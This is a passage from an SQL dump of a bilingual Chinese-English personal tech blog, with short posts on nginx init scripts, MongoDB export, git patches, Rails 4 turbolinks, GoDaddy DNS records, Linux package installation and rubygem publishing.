n  <tr>\r\n    <td>NEC</td>\r\n    <td><code>0409</code>\r\n</td>\r\n  </tr>\r\n  <tr>\r\n    <td>Nook</td>\r\n    <td><code>2080</code>\r\n</td>\r\n  </tr>\r\n  <tr>\r\n    <td>Nvidia</td>\r\n    <td><code>0955</code>\r\n</td>\r\n  </tr>\r\n  <tr>\r\n    <td>OTGV</td>\r\n    <td><code>2257</code>\r\n</td>\r\n  </tr>\r\n  <tr>\r\n    <td>Pantech</td>\r\n    <td><code>10a9</code>\r\n</td>\r\n  </tr>\r\n  <tr>\r\n    <td>Pegatron</td>\r\n    <td><code>1d4d</code>\r\n</td>\r\n  </tr>\r\n  <tr>\r\n    <td>Philips</td>\r\n    <td><code>0471</code>\r\n</td>\r\n  </tr>\r\n  <tr>\r\n    <td>PMC-Sierra</td>\r\n    <td><code>04da</code>\r\n</td>\r\n  </tr>\r\n  <tr>\r\n    <td>Qualcomm</td>\r\n    <td><code>05c6</code>\r\n</td>\r\n  </tr>\r\n  <tr>\r\n    <td>SK Telesys</td>\r\n    <td><code>1f53</code>\r\n</td>\r\n  </tr>\r\n  <tr>\r\n    <td>Samsung</td>\r\n    <td><code>04e8</code>\r\n</td>\r\n  </tr>\r\n  <tr>\r\n    <td>Sharp</td>\r\n    <td><code>04dd</code>\r\n</td>\r\n  </tr>\r\n  <tr>\r\n    <td>Sony</td>\r\n    <td><code>054c</code>\r\n</td>\r\n  </tr>\r\n  <tr>\r\n    <td>Sony Ericsson</td>\r\n    <td><code>0fce</code>\r\n</td>\r\n  </tr>\r\n  <tr>\r\n    <td>Teleepoch</td>\r\n    <td><code>2340</code>\r\n</td>\r\n  </tr>\r\n  <tr>\r\n    <td>Toshiba</td>\r\n    <td><code>0930</code>\r\n</td>\r\n  </tr>\r\n  <tr>\r\n    <td>ZTE</td>\r\n    <td><code>19d2</code>\r\n</td>\r\n  </tr>\r\n</tbody>\r\n</table>',0,'2013-06-14 02:55:00','2013-06-14 02:58:48','2013-06-14 02:58:48',1,NULL,'capture-android-device-in-linux','','','',627,'capture-android-device-in-linux'),(139,'setup nginx as a service in linux ( 把nginx设置成自动启动 ) ','<p>refer to:&#160;<a href=\"http://articles.slicehost.com/2007/10/17/ubuntu-lts-adding-an-nginx-init-script\">http://articles.slicehost.com/2007/10/17/ubuntu-lts-adding-an-nginx-init-script</a>\r\n</p>\r\n<div class=\"article\">\r\n\r\n  <h1><a href=\"/2007/10/17/ubuntu-lts-adding-an-nginx-init-script\" title=\"Ubuntu LTS - adding an nginx init script\">Ubuntu LTS - adding an nginx init script</a>\r\n</h1> \r\n    \r\n      <p>In the <a href=\"http://articles.slicehost.com/2007/10/16/ubuntu-lts-installing-nginx\" title=\"Ubuntu LTS - installing nginx\">previous article</a> we installed nginx from source. However, installing from source does not create an init script.</p>\r\n\r\n<p>Let\'s create such a script so we can easily start, stop and restart nginx and, perhaps more importantly, ensure it automatically starts on a reboot.</p>\r\n\r\n      <hr />\r\n\r\n      \r\n    \r\n    \r\n\r\n      <h3>Assumption</h3>\r\n\r\n<p>I am assuming you have installed nginx from source using the options shown in the <a href=\"http://articles.slicehost.com/2007/10/16/ubuntu-lts-installing-nginx\" title=\"Ubuntu LTS - installing nginx\">previous article</a>.</p>\r\n\r\n<p>If you have used other options or have place the nginx binary in a directory other than /usr/local/sbin/ then you may need to adjust the script shown below.</p>\r\n\r\n<h3>Stop</h3>\r\n\r\n<p>If you have nginx running then stop the process using:</p>\r\n\r\n<pre><code>sudo kill `cat /usr/local/nginx/logs/nginx.pid`</code>\r\n</pre>\r\n\r\n<h3>Init script</h3>\r\n\r\n<p>The script shown below is from an Ubuntu Feisty install and has been adapted to take into account our custom install of nginx.</p>\r\n\r\n<p>Let\'s go ahead and create the script:</p>\r\n\r\n<pre><code>sudo nano /etc/init.d/nginx</code>\r\n</pre>\r\n\r\n<p>Inside the blank file place the following:</p>\r\n\r\n<pre><code>#! /bin/sh\r\n\r\n### BEGIN INIT INFO\r\n# Provides:          nginx\r\n# Required-Start:    $all\r\n# Required-Stop:     $all\r\n# Default-Start:     2 3 4 5\r\n# Default-Stop:      0 1 6\r\n# Short-Description: starts the nginx web server\r\n# Description:       starts nginx using start-stop-daemon\r\n### END INIT INFO\r\n\r\n\r\nPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\r\nDAEMON=/usr/local/sbin/nginx\r\nNAME=nginx\r\nDESC=nginx\r\n\r\ntest -x $DAEMON || exit 0\r\n\r\n# Include nginx defaults if available\r\nif [ -f /etc/default/nginx ] ; then\r\n        . /etc/default/nginx\r\nfi\r\n\r\nset -e\r\n\r\ncase \"$1\" in\r\n  start)\r\n        echo -n \"Starting $DESC: \"\r\n        start-stop-daemon --start --quiet --pidfile /usr/local/nginx/logs/$NAME.pid \\\r\n                --exec $DAEMON -- $DAEMON_OPTS\r\n        echo \"$NAME.\"\r\n        ;;\r\n  stop)\r\n        echo -n \"Stopping $DESC: \"\r\n        start-stop-daemon --stop --quiet --pidfile /usr/local/nginx/logs/$NAME.pid \\\r\n                --exec $DAEMON\r\n        echo \"$NAME.\"\r\n        ;;\r\n  restart|force-reload)\r\n        echo -n \"Restarting $DESC: \"\r\n        start-stop-daemon --stop --quiet --pidfile \\\r\n                /usr/local/nginx/logs/$NAME.pid --exec $DAEMON\r\n        sleep 1\r\n        start-stop-daemon --start --quiet --pidfile \\\r\n                /usr/local/nginx/logs/$NAME.pid --exec $DAEMON -- $DAEMON_OPTS\r\n        echo \"$NAME.\"\r\n        ;;\r\n  reload)\r\n      echo -n \"Reloading $DESC configuration: \"\r\n      start-stop-daemon --stop --signal HUP --quiet --pidfile /usr/local/nginx/logs/$NAME.pid \\\r\n          --exec $DAEMON\r\n      echo \"$NAME.\"\r\n      ;;\r\n  *)\r\n        N=/etc/init.d/$NAME\r\n        echo \"Usage: $N {start|stop|restart|force-reload}\" &gt;&amp;2\r\n        exit 1\r\n        ;;\r\nesac\r\n\r\nexit 0</code>\r\n</pre>\r\n\r\n<p>You can also download the script from <a href=\"http://articles.slicehost.com/assets/2007/10/17/nginx\" title=\"Nginx Init Script\">here</a> (as it\'s a shell script, you may get a warning about it being a \'BIN\' file, just save as normal and open in any text editor).</p>\r\n\r\n<p>There\'s not really the space to go into the workings of the script but suffice to say, it defines where the main nginx binary is located so nginx can be started correctly.</p>\r\n\r\n<p>It also defines where to find the nginx.pid file so the process and be correctly stopped and restarted.</p>\r\n\r\n<h3>Execute</h3>\r\n\r\n<p>As the init file is a shell script, it needs to have executable permissions.</p>\r\n\r\n<p>We set them like so:</p>\r\n\r\n<pre><code>sudo chmod +x /etc/init.d/nginx</code>\r\n</pre>\r\n\r\n<h3>update-rc</h3>\r\n\r\n<p>Now we have the base script prepared, we need to add it to the default run levels:</p>\r\n\r\n<pre><code>sudo /usr/sbin/update-rc.d -f nginx defaults</code>\r\n</pre>\r\n\r\n<p>The output will be similar to this:</p>\r\n\r\n<pre><code>Adding system startup for /etc/init.d/nginx ...\r\n   /etc/rc0.d/K20nginx -&gt; ../init.d/nginx\r\n   /etc/rc1.d/K20nginx -&gt; ../init.d/nginx\r\n   /etc/rc6.d/K20nginx -&gt; ../init.d/nginx\r\n   /etc/rc2.d/S20nginx -&gt; ../init.d/nginx\r\n   /etc/rc3.d/S20nginx -&gt; ../init.d/nginx\r\n   /etc/rc4.d/S20nginx -&gt; ../init.d/nginx\r\n   /etc/rc5.d/S20nginx -&gt; ../init.d/nginx</code>\r\n</pre>\r\n\r\n<p>Done.</p>\r\n\r\n<h3>Start, Stop and Restart</h3>\r\n\r\n<p>Now we can start, stop and restart nginx just as with any other service:</p>\r\n\r\n<pre><code>sudo /etc/init.d/nginx start\r\n...\r\nsudo /etc/init.d/nginx stop\r\n...\r\nsudo /etc/init.d/nginx restart</code>\r\n</pre>\r\n\r\n<p>The script will also be called on a reboot so nginx will automatically start.</p>\r\n\r\n<h3>Summary</h3>\r\n\r\n<p>Adding a process to the run levels like this saves a lot of frustration and effort, not only in manually starting and stopping the process, but it having it automatically start on a reboot.</p>\r\n\r\n<p>PickledOnion.</p>\r\n    \r\n</div>\r\n\r\n\r\n',0,'2013-06-15 01:00:00','2013-06-15 01:02:43','2013-06-15 01:02:43',1,NULL,'make-nginx-a-service-in-ubuntu','','','',428,'make-nginx-a-service-in-ubuntu'),(140,'对日志的压缩和处理 ( gzip, zgrep log files ) ','<p>1. compress a file: &#160;$ gzip &lt;file_name&gt;&#160;</p>\r\n<p>2. search a regex from a zipped file : &#160;$ zgrep \"abc\" some_file.gz</p>',0,'2013-06-27 06:29:00','2013-06-27 06:31:00','2013-06-27 06:31:00',1,NULL,'gzip-and-zgrep-log-files','','','',487,'gzip-and-zgrep-log-files'),(141,'hosting on godaddy.  ','<p>简单到无法想象&#160;&#160; so simple. </p>\r\n\r\n<p>80端口被封，只好放弃花生壳。&#160;&#160; 80port was blocked in China mainland, since&#160; this July </p>\r\n<p>国内主机不考虑，&#160; I won\'t consider the virtual hosts in China. </p>\r\n<p>国外的heroku人气很高，，上去一看，完全跟传统的SSH 操作不一样。所有的功能都成了service， 我需要一个一个的学习addon, plugin...&#160; command line. ...天啊。 Heroku is popular, but for me, it\'s not the same way that I did as in other linux hosts. I have to learn those services and plugins one by one....</p>\r\n<p>看了下godaddy,&#160; 一个月才40美刀不到，太便宜了。果断买之~~~~&#160;&#160;&#160; so I switched to godaddy,&#160; 40 dollars per month. </p>\r\n<p>需要开通SSH服务， 只需要输入你的电话号码，对方马上自动电话过来，告知一个PIN密码。就可以用了&#160;&#160; once you gave your phone number to godaddy, it will give you a PIN number via a phone call. </p>\r\n\r\n<p>让我试一试。。。之后再奉上经验。</p>',0,'2013-11-10 10:33:00','2013-11-10 10:39:01','2013-11-10 10:39:01',1,NULL,'hosting-in-godaddy','','','',457,'hosting-in-godaddy'),(142,'使用mongoexport 按条件导出数据 (export mongo database by search conditions)','<p>referred post: <a href=\"http://www.glenscott.co.uk/blog/exporting-a-single-document-from-mongodb/\" target=\"_blank\">http://www.glenscott.co.uk/blog/exporting-a-single-document-from-mongodb/</a> \r\n</p>\r\n<p>简单的说： (long in short)&#160;</p>\r\n<p>导出： &#160;/ export:&#160;</p>\r\n<p>$ mongoexport -d \'m_video_fetcher_production\' -c \'plans\' -q \'{cms_category_class: /IphoneSubChannel/}\' -o ios_sub_channel_plans.js -p</p>\r\n<p>导入： / import&#160;</p>\r\n<p>$ mongoimport -p -d \'m_video_fetcher_real_production\' -c \'plans\' ios_sub_channel_plans.js</p>',0,'2013-11-14 08:16:00','2013-11-14 08:22:05','2013-11-14 08:22:05',1,NULL,'export-import-data-by-certain-condition','','','',550,'export-import-data-by-certain-condition'),(143,'git patch/apply 某一个commit  ( apply a patch generated from a specific commit ) ','<p>如何在另外一个机器上 apply某个 path？ &#160;</p>\r\n<p>我们遇到一个情况， 在某个机器上，需要一个紧急部署，但是又不希望手工去修改（因为已经有了一个commit 了）。这样的情况下，可以使用git path 专门为某个commit 生成patch, 然后在这个远程机器上apply it. &#160;(&#160;apply a patch generated from a specific commit ?)</span>\r\n</p><p>$ git format-patch -1 &lt;sha&gt; &#160; # =&gt; &#160;0001__.patch</p>\r\n<p>$ git apply &lt;path_file&#160;&gt;</p>\r\n<p>see:&#160;<a href=\"http://stackoverflow.com/questions/6658313/generate-a-git-patch-for-a-specific-commit\" title=\"http://stackoverflow.com/questions/6658313/generate-a-git-patch-for-a-specific-commit\" target=\"_blank\">http://stackoverflow.com/questions/6658313/generate-a-git-patch-for-a-specific-commit</a>\r\n</p>',0,'2013-11-14 10:57:00','2013-11-14 11:01:44','2013-11-14 11:01:44',1,NULL,'apply-a-patch-generated-from-a-specific-commit','','','',501,'apply-a-patch-generated-from-a-specific-commit'),(144,'Rails 4 取消turbolinks ( remove turbolinks from Rails 4)','<p>turbolinks 的作用是为了加快js的加载。把它放到了cache中。 &#160; ( it\'s said that using turbolink makes your browser loading js/css faster)&#160;</p>\r\n<p>我觉得很不爽，很多时候都会使我的JS出现莫名其妙的问题。 &#160; ( but I don\'t like it since it makes me lots of wired problems )</p>\r\n<p>有了angular, 我们要 turbolink干什么？ 直接干掉！ ( so lets remove it from our Rails 4 since we haveAngular already ~ :))&#160;</p>\r\n<p>refer to : 参考文章：&#160; <a href=\"http://blog.steveklabnik.com/posts/2013-06-25-removing-turbolinks-from-rails-4\"> this post\r\n</a>\r\n</p>\r\n<p>1. Remove the gem \'turbolinks\' line from your Gemfile.</p>\r\n<p>2. Remove the //= require turbolinks from your app/assets/javascripts/application.js.\r\n</p>\r\n<p>3. In your application.html.erb (layout file), change the js declaration:&#160;</p>\r\n<p>&#160;&lt;%= javascript_include_tag \"application\", \"data-turbolinks-track\" =&gt; true %&gt; \r\n to</p>\r\n<p>&#160;&lt;%= javascript_include_tag \"application\" %&gt; \r\n</p>\r\n<p>That\'s it. Prost! :)\r\n</p>',0,'2013-11-17 11:12:00','2013-11-16 03:17:33','2013-12-23 06:51:58',1,NULL,'remove-turbolinks-from-rails4','','','',634,'remove-turbolinks-from-rails4'),(145,'CSS中的over flow. ( overflow in CSS layout) ','<p>最近几天遇到一个问题： 如何实现土豆客户端中的预览。 ( these day I met a problem: I can\'t make a div\'s content scroll-x )</p>\r\n<p>如图： &#160; &#160; （略）</p>\r\n<p>实际效果确实这样： &#160;（图）</p>\r\n<p>后来反思了一下，发现 这样的代码是可以正常工作的： &#160; ( after thinking for a day, I found the code below works! )</p>\r\n<pre>    <div style=\"width:200px; height: 200px; border: 1px solid red; scroll:true;\r\n        overflow-x: scroll; \"> Parent Div\r\n      <div style=\"width: 300px ; height: 100px; border : 2px solid blue; float: left\">Float Sub Div</div>\r\n      <div style=\"width: 300px ; height: 100px; border : 2px solid blue; float: left\">Float Sub Div</div>\r\n    </div>\r\n</pre>\r\n<p> 所以问题的关键在于： 要让 Sub Div 的 宽度 大于 Parent Div 的宽度！ 就可以了！ &#160;( so the key is: make sure the \"sub div\"\'s width is greater than parent div\'s width.&#160;</p> \r\n<p>(对于土豆客户端，最后我的解决方案是，把所有的div 放到一个大table中去。 这样 大table做为 子div就会使parent div呈现 overflow的状态 &#160;( and for the solution of my case, I used a \'table\' to wrap all the subdivs and then put this table to parent div. everything is ok now)&#160;</p>',0,'2013-11-17 05:43:00','2013-11-17 05:50:35','2013-11-17 05:50:35',1,NULL,'overflow-in-css-layout','','','',467,'overflow-in-css-layout'),(146,'如何从现有项目中提取出新项目(how to extract new project from existing one )','<p>步骤非常简单： (quite simple if following the steps below: )</p>\r\n<p>1. $ copy &lt;old_project&gt; &lt;new_project&gt; -r &#160; &#160; &#160; &#160; 。 &#160;把老项目复制一份。（copy the old project )&#160;</p>\r\n<p>2. 把无用的文件从老项目中删除！ &#160; （ remove redundant files from the new_project. &#160; &#160; ）</p>\r\n<p>实践证明： 复制老项目，删除无用文件 这个步骤是最省时省力的！ 绝对不要 根据现有项目，摘取 功能点，然后再写新项目。 累死</p>\r\n<p>（ this is my best practise, never &amp; ever try to extract the functions from old project and then re-implement them in a new project ( or copy the files to the new project ) )&#160;</p>',0,'2013-11-23 07:02:00','2013-11-23 07:08:00','2013-11-23 07:08:00',1,NULL,'how-to-extract-new-project-from-existing-one','','','',1501,'how-to-extract-new-project-from-existing-one'),(147,'安卓手机耗电特别快（媒体服务器） ( disable your sound/voice in your android settings ) ','<p>(short answer: disable the voice/sound from your screen touch operation-- in settings. &#160;)&#160;</p>\r\n<p>我的HUAWEI MATE一直用的好好的，但是最近发现电池消耗的特别快。 半小时耗电就24%了。&#160;</p>\r\n<p>后来查看电池使用情况，发现是 媒体服务器耗电特别多。 （见截图）</p>\r\n<p>搜索了一下，把声音关掉就可以了。 &#160;&#160;</p>\r\n<p>见：  <a target=\"_blank\" href=\"http://bbs.gfan.com/android-3579685-1-1.html\">http://bbs.gfan.com/android-3579685-1-1.html</a>\r\n</p> ',0,'2013-11-29 01:48:00','2013-11-29 01:49:36','2013-11-29 01:49:36',1,NULL,'disable-your-sound-settings-to-save-android-battery','','','',1052,'disable-your-sound-settings-to-save-android-battery'),(148,'gimp中如何画圆圈 （ how to draw circle in gimp)','<p>Ellipse select tool &gt; Start selecting &gt; Hold down shift &gt; Click on the circle to select it &gt; Edit (Menu) &gt; Stroke Selection - Voila!</p>\r\n<p>Alternative method: Select a circle again &gt; Fill it &gt; Select (menu) &gt; Shrink few pixels &gt; Delete</p>',0,'2013-11-29 10:06:00','2013-11-29 10:11:41','2013-11-29 10:11:41',1,NULL,'gimp中如何画圆圈 （ how to draw circle in gimp)','','','',719,'gimp-how-to-draw-circle-in-gimp'),(149,'reduce/inject 方法的用法（ the usage of reduce/inject in Ruby)','<p>用了5年RUBY了，今天居然头一回遇到这个情况： &#160; 需要对某个数组中的所有操作进行 &#160; 的操作。 ( For the past years, I have not met this kind of questions until this morning, I need to loop all the elements of an array and return an result:  ) </p>\r\n<pre>current_element.product(next_element)\r\n</pre>\r\n<p>搜索了一下， 应该使用 reduct/inject 方法.&#160; ( after googling around, I found I should use the method: inject/reduce )</p>\r\n<pre>some_array = [1,2,3]\r\nsome_array.inject(0) { |memo, n| memo = memo + n}  # =&gt; 0+6 = 6\r\n</pre>\r\n\r\nsee: <a href=\"http://stackoverflow.com/questions/1538789/how-to-sum-array-members-in-ruby\" target=\"_blank\">http://stackoverflow.com/questions/1538789/how-to-sum-array-members-in-ruby</a>',0,'2013-12-03 02:15:00','2013-12-03 02:21:08','2013-12-03 02:21:08',1,NULL,'usage-of-inject-in-ruby','','','',542,'usage-of-inject-in-ruby'),(150,'angular 的短板, rails 中UT的长处？( angular unit test v.s. rails UT\'s render_view)','<p>用angular 做了3个项目（一个自己做，另外两个我带着项目组中其他人做）。 遇到的问题是： &#160;( after 3 projects using angular, we met this problem: )</p>\r\n<p>随着项目的增长，自动化测试（单元测试/功能性测试） 越来越重要。 对model的测试不多， 因为model仅仅是对DB的封装。 而且没啥太多逻辑。 逻辑都集中在 lib 中（rails）， 出问题的地方主要集中在controller, view中。 ( in Rails, it\'s very easy to write an automation test testing both controller and view. but in Angular, because of the complete decouple, we have to write 2 kind of unit tests separately. )</p>\r\n<p>因为angular跟 后台程序解藕特别好，所以 无法运行一个测试，就又测angular， 又测后台接口。</p>\r\n<p>而RAILS就很简单了。 一个render_views 就可以 从controller 测试到 view.  例如： &#160;(this is the rails\' code: )</p>\r\n<pre># -*- encoding : utf-8 -*-\r\nrequire \'spec_helper\'\r\n\r\ndescribe PlansController do\r\n  render_views\r\n  before do\r\n    request.env[\"HTTP_REFERER\"] = root_path\r\n    @plan = create(:plan)\r\n  end \r\n\r\n  it \'should get index\' do\r\n    get :index\r\n  end\r\nend\r\n</pre>\r\n<p>所以，目前看来，RAILS 这边还是很超前的。 耦合性虽然比 ANGULAR的大一些，但是从杠杆的角度讲，同学们觉得 使用RAILS更舒服一些，也容易坚持写单元测试（自动化测试） &#160; &#160;( as a concolusion, I think rails unit test is preferred by Chinese coder like us: we don\'t have the Agile environment and Agile management, &#160;so maybe rails is more suitable for us ? )&#160;</span>\r\n</p><p></span>\r\n</p><p></span>\r\n</p><p></span>\r\n</p>',0,'2013-12-05 10:19:00','2013-12-05 10:33:18','2013-12-05 10:33:18',1,NULL,'angular-unit-test-vs-rails-unit-test','','','',474,'angular-unit-test-vs-rails-unit-test'),(151,'godaddy会莫名其妙的修改你域名的A记录( your domain name would be modified by godaddy in some case) ','<p>很神奇， GODDAY 对域名的操作入口有两个， &#160; ( it\'s very strange that there are 2 places that we could modify the settings )&#160;</p>\r\n<p><img src=\"/system/images/BAhbBlsHOgZmSSI2MjAxMy8xMi8wNS8xOF80N18xMl84NzVfZ29kZGF5X2RvbWFpbl9zZXR0aW5nLnBuZwY6BkVU/godday_domain_setting.png\" title=\"Godday Domain Setting\" alt=\"Godday Domain Setting\" rel=\"225x255\" width=\"1280\" height=\"800\" /></p>\r\n<p>我们要总是编辑\"Zone File\" : &#160;( we should always perform the edit operation in \'zone file editor\' )&#160;</p>\r\n<p><img src=\"/system/images/BAhbBlsHOgZmSSI3MjAxMy8xMi8wNS8xOF81Ml8xOV85NTZfZWRpdF9nb2RhZGR5X3pvbmVfZmlsZS5wbmcGOgZFVA/edit_godaddy_zone_file.png\" title=\"Edit Godaddy Zone File\" alt=\"Edit Godaddy Zone File\" rel=\"225x255\" width=\"1280\" height=\"800\" /></p>',0,'2013-12-05 10:40:00','2013-12-05 10:53:47','2013-12-05 10:53:47',1,NULL,'dont-let-godaddy-modify-your-domain-settings','','','',549,'dont-let-godaddy-modify-your-domain-settings'),(152,'使用mongoid 后无法generate migration ( can\'t involk rails g migration)','<p>看这里有解决方案： ( see this post:&#160; <a href=\"http://stackoverflow.com/questions/6372626/using-active-record-generators-after-mongoid-installation\">http://stackoverflow.com/questions/6372626/using-active-record-generators-after-mongoid-installation</a>) </p> \r\n\r\n<pre>$ rails g active_record:migration \r\n</pre>\r\n<p> 之所以会这样，是因为mongoid 一样会调用 rails g生成mongoid 需要的ORM MODEL. &#160;( this is caused by mongoid\'s ORM strategy which would generate a model for mongoid but not ActiveRecord )&#160;</p> ',0,'2013-12-08 06:23:00','2013-12-08 06:26:48','2013-12-08 06:26:48',1,NULL,'using-active-record-generators-after-mongoid-installation','','','',450,'using-active-record-generators-after-mongoid-installation'),(153,'在新做的Linux系统上安装第三方包(install libs on bare linux)','<p>参考：\r\n\r\n<a target=\"_blank\" href=\"http://www.jasonrowland.com/2009/12/30/bare-ubuntu-configuration-for-ruby-on-rails/\">http://www.jasonrowland.com/2009/12/30/bare-ubuntu-configuration-for-ruby-on-rails/</a>\r\n</p>\r\n<p> on ubuntu</p>\r\n<pre>$ sudo apt-get install libapr1-dev libxml2-dev  libxslt-dev mysql-server libmysqlclient-dev\r\n$ sudo apt-get install git curl build-essential libssl-dev libreadline-dev\r\n$ sudo apt-get install libopenssl-ruby build-essential libssl-dev libreadline-dev vim</pre>\r\n\r\n<h5> on centus: </h5>\r\n<pre>$ yum install curl curl-devel zlib-devel openssl-devel cpio expat-devel gettext-devel\r\n$ yum install bash curl git patch\r\n$ yum install gcc-c++ patch readline readline-devel zlib zlib-devel libyaml-devel libffi-devel openssl-devel make bzip2 autoconf  automake libtool bison iconv-devel  bzip2-devel  libbz2-devel\r\n</pre>\r\n<p>\r\ninstall VIM, RUBY, gems: \r\n</p>\r\n<pre>$ git clone git://github.com/sstephenson/rbenv.git ~/.rbenv\r\necho \'export PATH=\"$HOME/.rbenv/bin:$PATH\"\' &gt;&gt; ~/.bashrc\r\necho \'eval \"$(rbenv init -)\"\' &gt;&gt; ~/.bashrc\r\nexec $SHELL -l\r\ngit clone git://github.com/sstephenson/ruby-build.git ~/.rbenv/plugins/ruby-build\r\n\r\n$ git clone https://github.com/gmarik/vundle.git ~/.vim/bundle/vundle</pre>\r\n<p>(more details for installing vim , check this out: <a target=\"_blank\" href=\"http://siwei.me/blog/posts/installing-vim-and-vundle\">http://siwei.me/blog/posts/installing-vim-and-vundle</a> )</p>',0,'2013-12-11 07:15:00','2013-12-11 08:39:04','2014-07-16 06:33:28',1,NULL,'install-libs-on-bare-linux','','','',519,'install-libs-on-bare-linux'),(154,'解决 apt-get 失败引起的lock (remove lock file caused by broken apt-get install  )','\r\n<pre>rm /var/lib/dpkg/lock\r\nrm /var/cache/apt/archives/lock\r\n</pre>',0,'2013-12-12 03:09:00','2013-12-12 03:12:08','2013-12-12 03:12:08',1,NULL,'remove-lock-file-caused-by-broken-apt-get-install','','','',430,'remove-lock-file-caused-by-broken-apt-get-install'),(155,'如何实现底部的斑马条( implement the striped title in bottom) ','<p>关键是： &#160;在斑马条上面加一个 空白区域的 place holder div. 如下图的红色箭头部分 ( the key is: add a blank area as the \"place holder\" above the striped title area, show as below. )&#160;</p>\r\n<p><img src=\"/system/images/BAhbBlsHOgZmSSI+MjAxMy8xMi8xMi8xNl8wMV8wMl80MzBfaG93X3RvX2ltcGxlbWVudF9zdHJpcGVfdGl0bGUucG5nBjoGRVQ/how_to_implement_stripe_title.png\" title=\"How To Implement Stripe Title\" alt=\"How To Implement Stripe Title\" rel=\"225x255\" width=\"695\" height=\"332\" /></p>\r\n\r\n\r\n代码如下：\r\n<pre>&lt;div&gt;\r\n    &lt;div class=\"place_holder_above_striped_title\" style=\"height: 100px; width: 200px\"&gt;\r\n    &lt;div style=\"background-color: black; opacity: 0.5; color: white; height: 20px\"&gt; some title in striped area \r\n&lt;/div&gt;\r\n</pre>',0,'2013-12-12 08:00:00','2013-12-12 08:07:15','2013-12-12 08:07:15',1,NULL,'implement-striped-title-in-bottom ','','','',476,'implement-striped-title-in-bottom'),(156,'E: Internal Error, No file name for libapt-pkg4.12','<p>refer to:&#160; <a href=\"http://blog.khmersite.net/2013/10/e-internal-error-no-file-name-for-libapt-pkg4-12/\">http://blog.khmersite.net/2013/10/e-internal-error-no-file-name-for-libapt-pkg4-12/</a>\r\n</p>\r\n<p>E: Internal Error, No file name for libapt-pkg4.12<br />Leave a reply<br />When I tried to update an Ubuntu (12.04) machine with the usual apt-get command, this error message came up:</p>\r\n<p>Do you want to continue [Y/n]? Y<br />E: Internal Error, No file name for libapt-pkg4.12<br />Reading this post (http://ubuntuforums.org/showthread.php?t=2045321), one way to fix it is to download liapt-pkg4.12 and re-install it:</p>\r\n<p># apt-get download libapt-pkg4.12/precise-security<br /># dpkg -i libapt-pkg4.12_0.8.16~exp12ubuntu10.10_amd64.deb</p>',0,'2013-12-12 13:36:00','2013-12-12 13:38:12','2013-12-12 13:38:12',1,NULL,'internal-error-no-file-name-for','','','',708,'internal-error-no-file-name-for'),(157,'(域名中A记录与CNAME的影响）domain names:  A record v.s. CNAME in nginx config','<p>非常简单： 尽量使用A 记录，不要使用CNAME。 例如，为了让 www.siwei.me 和 siwei.me 都指向正常的地址。需要： &#160;( if you are using godaddy\'s domain management, don\'t use CNAME for your www subname, always use A record for both \'@\' and \'www\' sub names )&#160;</p>\r\n<p>正确的： ( correct: )&#160;</p>\r\n<p>A record: &#160;@ =&gt; &#160;&lt;your_host_ip&gt;, &#160;&#160;</p>\r\n<p>A record: &#160;www =&gt; &lt;your_host_ip&gt;&#160;</p>\r\n<p>错误的： &#160;( incorrect)&#160;</p>\r\n<p>Arecord : @ =&gt; &lt;your_host_ip&gt;</p>\r\n<p>CNAME: &#160;www =&gt; @</p>',0,'2013-12-16 12:18:00','2013-12-16 12:23:38','2013-12-16 12:23:38',1,NULL,'a-record-vs-cname-in-godaddy-domain-control','','','',572,'a-record-vs-cname-in-godaddy-domain-control'),(158,'安装nokogiri gem遇到错误。（error when installing nokogiri)','<p>安装 nokogiri 时遇到了错误，参考这里：    <a href=\"http://stackoverflow.com/questions/17914169/why-isnt-nokogiri-installing\" target=\"_blank\">http://stackoverflow.com/questions/17914169/why-isnt-nokogiri-installing</a>\r\n</p><p>\r\n\r\nNOKOGIRI_USE_SYSTEM_LIBRARIES=1 bundle install</p>',0,'2013-12-19 04:12:00','2013-12-19 04:14:52','2013-12-19 04:14:52',1,NULL,'error-when-installing-nokogiri','','','',538,'error-when-installing-nokogiri'),(159,'设置LINUX 的时区( set linux time zone) ','<p>很多时候，你的LINUX时间显示的不对，不是时间不对，而是时区错了。 &#160;(most of the time, the root cause you found the time is not correct is that your linux is not setup with the correct timezone)&#160;</p>\r\n<p>解决办法： for short: &#160;&#160;dpkg-reconfigure tzdata</p>\r\n<p>refer to:&#160; <a href=\"http://www.christopherirish.com/2012/03/21/how-to-set-the-timezone-on-ubuntu-server/\" target=\"_blank\">http://www.christopherirish.com/2012/03/21/how-to-set-the-timezone-on-ubuntu-server/</a>\r\n</p>\r\n<p>You can check your current timezone by just running</p>\r\n<p>$ date<br />Thu Mar 21 18:02:49 MST 2012</p>\r\n<p>Or checking the timezone file at</p>\r\n<p>$ more /etc/timezone<br />US/Arizona</p>\r\n<p>So to change it just run</p>\r\n<p>$ sudo dpkg-reconfigure tzdata<br />And follow on screen instructions.  Easy.</p>',0,'2013-12-19 03:42:00','2013-12-19 04:19:02','2013-12-19 04:19:02',1,NULL,'set-linux-timezone','','','',513,'set-linux-timezone'),(160,'经典方式发布一个rubygem (classic way to publish a rubygem ）','<p>（ 如何写gem, 在这里 simplest gem guide here: <a href=\"http://siwei.me/blog/posts/how-to-create-a-rubygem\">how to create a gem </a>&#160; ）&#160;</p>\r\n<p>1. 写好你的gem (finish your gem )&#160;</p>\r\n<p>2.&#160;gem build youku_video_utility.gemspec</p>\r\n<p>(确认你的credential 文件是正确的-- 登录rubygems.org之后，查看profile ) &#160;(make sure your rubygem\'s credential file is there and mod is correct)&#160;</p>\r\n<p>3.&#160;gem push youku_video_utility-0.1.0.gem</p>',0,'2013-12-20 03:31:00','2013-12-20 03:34:30','2013-12-21 10:03:14',1,NULL,'classic-way-to-publish-a-rubygem','','','',501,'classic-way-to-publish-a-rubygem'),(161,'使用 jeweler 来管理/发布/建立你的rubygem ( using jeweler to manage your rubygem project) ','refer to: <a href=\"https://github.com/technicalpickles/jeweler\" target=\"_blank\">https://github.com/technicalpickles/jeweler</a> . \r\n\r\nTODO: finish this post. <p>经典方式请看这里：&#160; <a href=\"http://siwei.me/blog/posts/classic-way-to-publish-a-rubygem\">http://siwei.me/blog/posts/classic-way-to-publish-a-rubygem</a>\r\n</p> ',0,'2013-12-20 03:34:00','2013-12-20 03:36:56','2013-12-20 03:37:32',1,NULL,'use-jeweler-to-manage-your-gem-project','','','',442,'use-jeweler-to-manage-your-gem-project'),(162,'在ruby中模拟CLASS。 ( openstruct and struct in Ruby )','<p>今天碰到一个困难，我想在gem 中调用另外一个项目的model. 可我又不想把那个项目的代码copy 过来，也不想用factory_girl, （太麻烦了）。 想到 delayed_job 中使用了struct 